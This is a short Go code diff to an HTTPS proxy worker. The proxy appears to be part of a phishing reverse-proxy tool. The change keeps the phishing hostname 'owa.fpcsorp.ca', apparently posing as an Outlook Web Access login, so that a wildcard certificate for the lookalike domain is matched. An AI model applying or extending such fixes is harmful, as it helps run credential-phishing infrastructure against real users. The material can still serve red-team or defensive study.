@@ -3922,7 +3922,9 @@ func (p *HttpProxy) httpsWorker() {
 			}
 			log.Debug("[httpsWorker] hostname OK: %s from %s, forwarding to proxy", hostname, remoteAddr)
 
-			hostname, _ = p.replaceHostWithOriginal(hostname)
+			// NOTE: Do NOT replace hostname with original here - TLSConfigFromCA needs the
+			// phish hostname (owa.fpcsorp.ca) to find the wildcard certificate (*.fpcsorp.ca).
+			// The hostname translation to original domain happens later during request proxying.
 
 			req := &http.Request{
 				Method: "CONNECT",
